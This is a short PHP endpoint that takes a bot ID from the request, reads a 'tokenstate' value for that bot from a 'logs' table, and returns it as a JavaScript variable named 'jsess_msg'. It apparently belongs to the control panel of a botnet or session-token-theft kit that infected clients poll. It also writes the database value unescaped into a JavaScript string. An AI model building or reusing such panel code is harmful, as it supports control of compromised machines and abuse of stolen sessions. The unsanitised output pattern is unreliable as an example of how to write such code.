<?php

require_once 'config/config.php';

 $state = '';
 $data = 'var return_msg = "NULL";';

if(!empty($_GET['state'])){$state = $_GET['state'];};
if(!empty($_GET['auth'])){$botid = $_GET['auth'];};

if(!empty($_POST['state'])){$state = $_POST['state'];};
if(!empty($_POST['auth'])){$botid = $_POST['auth'];};


//data from bd
     if($state == 'workstate')
   {

     $db = getDbInstance();
     $db->where('botid', $botid);

     $botstate = $db->getValue ("logs", 'tokenstate');

     $data = 'var jsess_msg = "'.$botstate.'";';

     echo $data;

   }


?>
